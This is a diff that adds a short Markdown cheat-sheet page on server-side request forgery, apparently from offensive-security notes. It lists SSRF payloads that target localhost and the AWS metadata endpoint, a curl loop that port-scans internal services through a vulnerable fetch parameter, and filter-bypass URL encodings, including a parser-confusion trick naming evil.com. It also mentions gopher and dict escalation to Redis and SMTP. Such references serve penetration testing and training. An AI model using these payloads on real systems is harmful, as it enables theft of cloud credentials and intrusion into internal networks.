@@ -1,0 +1,26 @@
+---
+title: "SSRF (Server-Side Request Forgery)"
+---
+
+Make the server issue requests on your behalf — reach internal services, cloud metadata, or scan the internal network.
+
+```bash
+# point a URL parameter at internal targets
+http://$IP/fetch?url=http://127.0.0.1:80/
+http://$IP/fetch?url=http://169.254.169.254/latest/meta-data/   # AWS metadata
+# internal port scan via response differences / timing
+for p in 22 80 3306 6379 8080; do curl -s "http://$IP/fetch?url=http://127.0.0.1:$p"; done
+```
+
+## Filter bypasses
+
+```text
+http://127.0.0.1        http://localhost        http://0.0.0.0
+http://0177.0.0.1       http://2130706433       (octal / decimal IP)
+http://[::1]            http://127.1
+http://internal.svc#@evil.com      (parser confusion)
+```
+
+<Warning>
+Blind SSRF? Use an out-of-band collector (Burp Collaborator / your own listener) to confirm the request fired. Gopher/dict schemes can turn SSRF into interaction with Redis, SMTP, etc.
+</Warning>
